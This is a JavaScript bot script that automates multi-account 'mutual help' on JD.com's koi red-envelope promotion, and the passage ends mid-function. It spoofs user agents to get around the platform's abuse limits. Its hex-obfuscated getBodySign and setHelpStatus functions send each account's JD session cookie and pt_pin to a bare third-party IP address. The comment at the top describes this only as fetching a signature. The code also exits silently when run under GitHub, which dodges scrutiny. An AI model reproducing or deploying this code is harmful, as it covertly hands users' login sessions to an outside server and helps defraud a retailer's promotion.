/*
锦鲤红包互助
入口：[京东App领券频道]
仅内部互助，Log会定时更新！

============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
2、新版本的锦鲤红包增加了同账号助力限制,超过2次后就会报火爆，脚本增加了次数检测限制。
3、为了防止系统火爆,只助力第1账号。
4、由于每次助力都要获取新的签名，建议大家每天执行4,5次 时间平均间隔好
*/

const $ = new Env("Sami锦鲤红包互助")
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
!(async () => {
    requireConfig()
    for (let i = 0; i < 4; i++) {
        $.data1 =''
        cookie = cookiesArr[i]
        
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.nickName = '';
        let data = await requestApi('h5launch', helpNo(i));
        if (data?.data?.result?.status == 1){
           console.log(`账号【${$.index}】火爆1`)
           //continue;
           break;
        }
        console.log(`\n账号【${$.index}】${$.UserName} 只助力第1账号`);
        data = await requestApi('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
         if (data?.data?.code == 20002) {
             console.log(`账号${$.index},已达拆红包数量限制`)
         }else if (data?.data?.code == 10002) {
             console.log(`账号${$.index},火爆`)
         }else if (data?.data?.code == 20001) {//红包活动正在进行，可拆
             console.log(`互助码: ${data.data.result.redpacketInfo.id}`);
             shareCodes.push(data.data.result.redpacketInfo.id);
         }
    }
    await OpenRedEnvelopes($.index);
    await help();
    await OpenRedEnvelopes($.index);
    await $.wait(5000);
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })


async function help(){
    console.log(`\n******开始助力: 内部互助中，******\n`);
    try {
        for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.nickName = '';
        $.UserName1 =encodeURIComponent($.UserName)
        if (i>=0){
            //console.log($.UserName1)
            let data11 = await getBodySign(shareCodes[0],i,$.UserName1)
            if(data11 === undefined){
                data11 = await getBodySign(shareCodes[0],i,$.UserName1)
                
            }
            if (data11.code === 100){
                //console.log('11')
                let result = await requestApi('jinli_h5assist', data11.data)
                //console.log(result)
                if(result.code === 0 && result.rtn_code === 0){
                   if(result.data.result.status === 0){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n您已助力成功!\n`);
                        await setHelpStatus($.UserName1);
                        await $.wait(5000);
                   }else if(result.data.result.status === 4){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号火爆了!\n`);
                        await $.wait(2000);
                   }else if(result.data.result.status === 1){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n不能重复为好友助力哦!\n`);
                        await setHelpStatus($.UserName1);
                        await $.wait(2000);
                   }else if(result.data.result.status === 8){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n抱歉，你不能为自己助力哦!\n`);
                        await $.wait(2000);
                   }
                }else if(result.code === 0 && result.rtn_code === 403){
                    console.log(`账号【${$.index}】 助力: 同时段助力太频繁，建议3小时后再执行!\n`);
                }else if(result.code === 3){
                    console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号助力太快,被系统检测到了,只能等下次再执行了!\n`);
                    await $.wait(5000);
                }
                //console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n${$.data1}\n`);
                //{"code":0,"data":{"biz_code":0,"code":0,"result":{"assistReward":{"beginTime":1646184567315,"discount":"0.03","endTime":1646323199315,"hbId":"33146518371","type":10},"followCode":0,"status":0,"statusDesc":"您已助力成功"},"success":true},"rtn_code":0}
                await $.wait(5000);
            }else if(data11.code === 102){
                console.log(`今日签名数据已经用完！`)
                await $.wait(2000);
            }else if(data11.code === 101){
                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n已经助力过,跳过本次助力!\n`);
                await $.wait(1000);
            }else{
                console.log(`参数错误！`)
                console.log(data11)
                await $.wait(1000);
            }
            
            
        }
    } 
    } catch (e) {
        $.logErr('Error: ', e, resp)
    } finally {
        //resolve()
    }
}

function requestApi(functionId, body = {}) {
    return new Promise(resolve => {
        $.post({
            url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${gettimestamp()}&clientVersion=10.3.4&osVersion=-1`,
            headers: {
                "Cookie": cookie,
                "origin": "https://happy.m.jd.com",
                "referer": "https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html?channel=9",
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-Requested-With": "com.jingdong.app.mall",
                "User-Agent": ua,
            },
            //body: `body=${escape(JSON.stringify(body))}`,
            body: body,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                $.data1=data
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

async function OpenRedEnvelopes(index){
    console.log(`\n******开始开红包******\n`);
    try {
        cookie = cookiesArr[0]
        data = await requestApi('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
        if (data?.data?.code == 20002) {
             console.log(`账号${index},已达拆红包数量限制`)
         }else{
              $.vo2=data.data.result
            for (let vo of  $.vo2.redpacketConfigFillRewardInfo) {
                console.log(`账号1,红包金额🧧🧧🧧：`+vo.operationWord)
                //console.log(vo);
                if(vo.packetStatus===0){
                    console.log("  没有可拆的红包！");
                }else if(vo.packetStatus===1){
                    //发现可拆红包，开始拆了
                    console.log("  发现可拆红包");
                    cookie = cookiesArr[0]
                    data = await requestApi('h5receiveRedpacketAll', hb());
                    if(data.code===0){
                        console.log("  拆到红包金额："+data.data.biz_msg+"-》"+data.data.result.discount);
                    }else{
                        console.log("  拆红包失败");
                    }
                    await $.wait(5000);
                }else if(vo.packetStatus===2){
                    //已经拆过红包了
                    console.log("  拆到红包金额："+vo.packetAmount);
                }
            }
         }
    } catch (e) {
        $.logErr('Error: ', e, resp)
    } finally {
        //resolve()
    }
}







function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}


function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `"${num}"`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}




var _0x1ca1=['body=%7B%22followShop%22%3A0%2C%22random%22%3A%2266335111%22%2C%22log%22%3A%221645956626363~11HuwulR4YlMDFOam95UzAyMQ%3D%3D.f1xbTGp7XFlIZXdbWQdmKxJZLwcpBDYJLX9GWVVkYlsRSy1%2FFAoRHCNHLQBjGlg8NAAFJF82CyUlOwkkMA%3D%3D.669322a5~7%2C1~0EB515350D83EE07863282B18DCFD0C3DB27B941~1a5fm4i~C~SRJFXREOam0eGkdbXhQJbxJXBR4EBB52cB4HcmgfVR1EEBQRUQQbBQMcdnIfBXZlH1MeRBMcEVAAHQQPH3BxGgRzfh9FH0YRbx8QVUJfEgkFHRJBSxEPEQcFAAUKBQUEAgQEAQQCCQIBFh0SRV1XFwkUR0BER0RVR1UQHxBFVVASCRZXVkZMR0FGVxEYEkNUXRAJaQceBQAGHAoYAAAeCR8AbhoRXloRCgIeEVFAEAgSBgNXUAlSAFpQBVACUAJWAFMLBVALUAoKB1UAC1FVUQoaHxddRhEOElpgW11dVxEeEEQTCgICBQULDQUDAQAAAgMfEllZEQgRUAFRCFRWBFVRVwhRBlZVC1IAUQMKUAFRAgFRBQQHAAwBVQZbVQxRAxEYElVAURAJEFZafV0cckoEZQJhdWB%2BfQZ8bFt8ZENFER4RXEQSCxJyREFcVxhwWl5GRkBVQRwTe11RHRAeEl9RRRYLEgMOBAwBBBEYEkBTQRAJaQQBBBwFAQdpHRJAVxEPaBRaZFhcXlYDAx4BEB4SWH9gFh0SAwsdAxEaEQUAHQMdABEeEQMEBwgCARYdElALUgxXUwNQUVYAUQFWUQtUAlICCVEGUgEBWwYABAULBFUHU1ULUQcRHhBRE20fFlhfUxoJF1VQVVJWVURHEB8QUlgQChNFERgTU1saCRdEBR0GHgcSHxBQVGxEEAoTAAEWHRJQXBEPEURSWlRcXQ4EBQEABwMBABIfFlxaEAJoBB8GHwRtHxJRXlxVEQgQAQcEBg0EBgQJBQACA00FckIHZGZLRlJHc311dnVmaXJLamd0S3hyCQ0dVHt8dmAASkVTAWpwV19UCmpyQnFwRABjdHEHAHd3Zlt9Sn9AcFgERlNgYnphckcEf0t1anNgXXl1ZmIIeEkMXmFFVEJWYHtkd0hqAH1aXGJ6cUVaYUhidnxKCmx7ZHFHdHBXA3J7Ald4VGNBfGBXRH1icUF%2BZ2cAf0pXcnFjVEVwd3Zrflp8A3hwRnp7QnpPekx6ZmBmfV9WcHN0cHd6AnF3bQB9AVAHekQLDhoIBQULUQNUUUxFHABOTUpzTmZ6aWRkBmlRdXVhe3ViZ2B6SmZndnIAZmhwYVFzZVpwcmEHYnZ3W3VhWmd%2Fd2F2cnBXe210XWluZgZEcXZiBmJwRGdgeFppZHFwAGV%2BYUZgYVhhZXdyand0Y2J6cEdgYXRMa2N3fgZydnNcCU4CUUsDRANKEB4SXENUFgsSEEU%3D~0u0lnvh%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D'];var _0x5b4a=function(_0x1ca154,_0x5b4a2c){_0x1ca154=_0x1ca154-0x0;var _0x552086=_0x1ca1[_0x1ca154];return _0x552086;};function helpNo(_0x10f4c4){if(_0x10f4c4<=0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2212018911%22%2C%22log%22%3A%221646029475192~1KnwC8o7cYwMDFMaUpnZTAyMQ%3D%3D.fV9%2BUVV%2BUH5RUn9YfxkkAgwIChU7KBpQG31FfEtSYFg0VRt9FyYUA38ZDh0wAVoeUy4UIDwANQ9eBwwkMg%3D%3D.eceb569b~7%2C1~F159CAFDD5FDBF4F4AA17F3B7BB57EDFA69BA249~1i5wyag~C~SBNFXRAKaBRWBh4FYR9%2BdxoAZ2YfUB9EER0TVAQdBmceegUcAGYDHlcdRxMfE1cGHgRjHHgCHwdnZB9RHUcWbxoTR19eEwlrEVUEHQBmHw51HAZpZR9VHkITHxNXBh4CZR0Jdx4GA2EeUR9EEx8WVgccAWcfCXQcBQBlHEccVRRvHBFXQ10WCAcdEUJAEwkSAgcFBgICCgIEBwMCBAYCAAYTHxNEVFcSCRNFREZER1BHVhEcE0RRUxQLEVdVRUdER0RQEh4SQ1JcEglrBR8CCgIdCh0CAR8BHwRsHBBaWRQIAR8SUkAWCBQFB1RSVQMBBVUBVVcBBVdUU1ZRCFVSUA4AAVUBVwAAVxMdElxAEQwQWWNYXl1REBoTRxMJAAUEBQEDCQYHBgcLAh8SW1gWCBRXUVcHAwcGAwIHUgUCBQdRVgVVBVEHAlBQBQIHAgdWCgACAlRVBlBXEh8SV0NWEAwTX0JVAkN0SWR8A2YEeG57RlRgcgR5WXcTHxNdRxEKEXBBQF5VE3VdXUNFRVZGHhZ4XVIdEx8SXVBHEggSAgAFCQcFEx8WQVVDEQtoCQICHwIGBW8cEURdEglrE1pkWllfVgAAHQISHxNYf2ESHxQDBR0AHwEWHhQAAx8AHwcSHxMABgUJBwMQHBFWU1UAAAIHAwIFUwQCBQBSVgRVB1QBAFVRBwAAAQJXCgAAA1VVBldUEh4SUhRvHBFZXlIWCBRXVVdVV1VERxMdElNaEQwQRREcE1BdEAwTRAIdAx0EER0TU1RvRRQIEgMCEx8WUFITCRNBUF1UXFwMAQAAAg4LAQISHRFZWBQLaAMfAh8Dbh0TUl5fVBQIEgIGBQUEAA8FBgcHAgFOAlpyRmJ%2BSmNoR319dXVZUwVnalJ3cEt%2BcgwMHmQBAnRQW3FlZFhyRmRndWthWGpzdWJeVGJzX259dWZCdVt2enICYVBgXVx8UVYEaHRhS0N1WXpTeWJxBXpdB1xqY3p9ZElaRWpkelx3SQtTe2VbHXBLX2B8dAIBe1ZCV2B0XGJidAd1flllc3JbWGVxSwtAfnMJXXdjdl56ZFhFelpxWmZwQ1VkckRTf3UJcXRbckF9SUtDYHFhen9lfkF9WwtEelpzZ3p0fh1iRwMHeFpTYXRGdmR2clx%2FcHAIRX10YlVwWnJpYktDVHpzA0hkSVhhYnB0an1ZW3J%2FSGYNHwcCA1QCBQEGT0kcAk9PTnBOZ118ZWtyaHpydGN0YEZpcHRbdWdjRwZha15damF2QXJyVQJpYklAaWJycnx3cXRicQdzZWdIYHRhXwdzdFYKdHFHdmZ2clFkdWcKZ3ZyXmZsWlVmZHNhZXRcZnRwV1FRdGNgZ3ZXBWRySkEMTQFJCAJaAEYTHBBdQFEQChESTA%3D%3D~1j6z9l5%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x14&&_0x10f4c4>0xa){return'body=%7B%22followShop%22%3A0%2C%22random%22%3A%2217826611%22%2C%22log%22%3A%221645956276992~1lg4WcZRHZ4MDFWa0FPZjAyMQ%3D%3D.Z111el9jXXN5XmRYeDEKDiknFx5lPTMgGGdHd2NRelo%2FfRhnFSQnKTtGAzZWAlkSAjUdJXEAPj0kFT8RKA%3D%3D.9078e19b~7%2C1~0034B33DDBD019F5BFCCCCA53AB289D3E40B05BC~0abzu6z~C~SBJFXxILa2wUEEVfWxEKaRVWAR4HfRV2CB8GZHscUBxFGh4TVQEeB3wbdwwfBmVvH1EfRBMeElUBHA99HXQPHwZrDh5BH0QRZB8SVEJfEAoAHBNLQRMLFAIGBgILAQUCBQEDAAYICAUIExwTT1dVEwwRREZDRkBVRVUbHxJEVVAQChNWV0xGRUVDUhIeFUJQXRIJYgccBAAGHgkdAQEUAx0Eax8SWF0QDgIcEVpAEgkSBgFUVQhTClBSAVUHUwRRAVcLB1AAUAgLB1UCCFRUUAAQHRNYQxIIFVtkW19dXBEcEUQTCAEHBAQBBwcDAQUJCwUeFllbEQMRUgBRCFZVAVRQXQJTAlNQCFQHUAcKUgFaAgNQBQQFAwkAVAxRVwhUBhIeFVREURIJG1ZYfF0ccEkBZANrf2J6eAN%2Falx9YENHERURXkUSCxBxQUBdXRJyXltDRUZSQBgTeV1aHRIfEl9TRhMKEwkEBggEARIeFUFXQRIJYgQDBRwFAwRsHBNKXRMLbRFZYl9dWlYBAxUBEh8SWH1jExwTCQEfBxQfEgMHHAcdAhEVEQEFBwgAAhMcE1oBUAhSVgBWVlcEUQNWWgtWA1ICC1IDUwALUQQEAQAIAlIGV1UJUQwRHBFRE28cE1leWRALE1BVVlRRVEBHEh8bUloRChNHEh0SUlEQCxNBAB4AGQYWHxJQX2xGEQoTAgITHBNaVhMLFEFRXFNdWQ4BBAEBBgUBABAcE11bGghqABoDHAJqHhZRXFxeEQoRAQcGBQgFBwoEBggOBU4DbwUGRXp6fmZ%2FQ311dHdSZQB7ZHVwTn1xDwocUANUBl0BAUliAgsDaAMEcVRLRld6WF0HUV1hG3x6fgN4WnNWfgMFGllZcEtScEABc0tDXHVwUgp6cmJCenFCZlJAWkFjZAdddV9ndXBJXFx6SFRVdUVlcnJGcVh1cHhWemNQXnYDW1R%2FW2VFd2VncXxzfGF5cGNbenJ%2FD3xgWEpjcURfY0pwdnZgR2hxc2h%2Bc0p9YXRqAGVqYHRKf2t6XHNHeHlwCl4GdUEODRxVVA0HAVYBUE5KHABMTk9yT2tae2BuS3V5cmRXf3hEaGd4cWJgd1dCUWZQe1d0cEtxd2ZFZnZYC25ncn59dEVTYXNGYWZ3c3BnZmUGenFUW2Z4RHVhd3NCdHdxQmt0cwllZHVdZXFcdnN7aHJ0cVd8YXhJamt9RUZlc1hDD0kDXlgGSQpcEh8SXEFXEwoTGk8%3D~18l5kyt%22%2C%22sceneid%22%3A%22JLHBhPageh5%22%7D';}if(_0x10f4c4<=0x1e&&_0x10f4c4>0x14){return _0x5b4a('0x0');}}

//getBodySign
var __encode ='',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdb1d0=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6A\x69\x6E\x6C\x69\x5F\x68\x35\x61\x73\x73\x69\x73\x74\x3F\x72\x65\x64\x50\x61\x63\x6B\x65\x74\x49\x64\x3D","\x26\x69\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x60b3x2,_0x60b3x3,_0x60b3x4){return  new Promise((_0x60b3x5)=>{$[__Oxdb1d0[0x6]]({url:`${__Oxdb1d0[0x0]}${_0x60b3x2}${__Oxdb1d0[0x1]}${_0x60b3x3}${__Oxdb1d0[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x60b3x4,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x60b3x6,_0x60b3x7,_0x60b3x8)=>{try{_0x60b3x8= JSON[__Oxdb1d0[0x3]](_0x60b3x8)}catch(e){$[__Oxdb1d0[0x5]](__Oxdb1d0[0x4],e,_0x60b3x7)}finally{_0x60b3x5(_0x60b3x8)}})})}(function(_0x60b3x9,_0x60b3xa,_0x60b3xb,_0x60b3xc,_0x60b3xd,_0x60b3xe){_0x60b3xe= __Oxdb1d0[0x7];_0x60b3xc= function(_0x60b3xf){if( typeof alert!== _0x60b3xe){alert(_0x60b3xf)};if( typeof console!== _0x60b3xe){console[__Oxdb1d0[0x8]](_0x60b3xf)}};_0x60b3xb= function(_0x60b3x10,_0x60b3x9){return _0x60b3x10+ _0x60b3x9};_0x60b3xd= _0x60b3xb(__Oxdb1d0[0x9],_0x60b3xb(_0x60b3xb(__Oxdb1d0[0xa],__Oxdb1d0[0xb]),__Oxdb1d0[0xc]));try{_0x60b3x9= __encode;if(!( typeof _0x60b3x9!== _0x60b3xe&& _0x60b3x9=== _0x60b3xb(__Oxdb1d0[0xd],__Oxdb1d0[0xe]))){_0x60b3xc(_0x60b3xd)}}catch(e){_0x60b3xc(_0x60b3xd)}})({})
//setHelpStatus
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdb1d3=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x73\x65\x74\x6A\x69\x6E\x6C\x69\x5F\x68\x35\x61\x73\x73\x69\x73\x74","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function 